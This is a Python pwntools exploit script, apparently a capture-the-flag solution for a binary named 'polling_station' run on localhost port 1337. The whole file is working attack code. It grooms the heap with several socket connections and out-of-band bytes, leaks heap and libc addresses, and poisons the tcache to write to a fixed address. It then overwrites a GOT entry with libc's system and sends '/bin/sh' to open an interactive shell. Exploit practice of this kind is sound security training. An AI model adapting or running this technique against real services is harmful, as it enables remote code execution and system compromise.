#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host LOCALHOST --port 1337 ../polling_station
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '../hosted/polling_station')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'LOCALHOST'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(b'port ')
port = int(io.recvuntil(b'\n', drop=True))
success('Port: ' + str(port))

# groom

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
sleep(1)

a = remote(host, port)
sleep(1)

b = remote(host, port)
sleep(1)

c = remote(host, port)
sleep(1)

d = remote(host, port)
sleep(1)

e = remote(host, port)
sleep(1)

f = remote(host, port)
sleep(1)

s.send(b'\0', socket.MSG_OOB)

sleep(1)

a.send(b'\0'*0x20)
a.close()

b.send(b'\0')
b.close()

c.send(b'\0'*0x20)
c.close()

d.send(b'\0'*0x40)
d.close()

e.send(b'\0'*0x420)
e.close()

f.send(b'\0'*0x60)
f.close()

sleep(1)

s.send(b'\0'*0x80)
s.close()

io.recvuntil(b'Response received: ')
io.recvuntil(b'Response received: ')
io.recvuntil(b'Response received: ')
io.recvuntil(b'Response received: ')
io.recvuntil(b'Response received: ')
io.recvuntil(b'Response received: ')
io.recvuntil(b'Response received: ')

# leak

a = remote(host, port)
sleep(1)

a.close()
sleep(1)

io.recvuntil(b'Response received: ')

libc = ELF('../../call_centre/solve/libc.so.6')

raw_leak = io.recv(0xe8)
heap_leak = u64(raw_leak[0x50:0x58])
success("heap leak: " + hex(heap_leak))
libc.address = u64(raw_leak[0xa0:0xa8]) - 0x203b20
success("libc leak: " + hex(libc.address))

# tcache poison

target = 0x404080
payload = flat({
    0x18: [
        0x0101010101010131,
        heap_leak ^ target,
        ],
})

a = remote(host, port)
sleep(1)
a.send(payload)
a.close()

a = remote(host, port)
sleep(1)
a.close()

# GOT overwrite

payload = flat({
    0x10: libc.sym['system'],
}, length=0x20)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
sleep(1)

a = remote(host, port)
sleep(1)

b = remote(host, port)
sleep(1)

s.send(b'\0', socket.MSG_OOB)

sleep(1)

a.send(flat({0x0: b'/bin/sh\0'}, length=0x20))
a.close()

b.send(payload)
b.close()

sleep(1)

s.send(b'\0'*0x80)
s.close()

io.interactive()

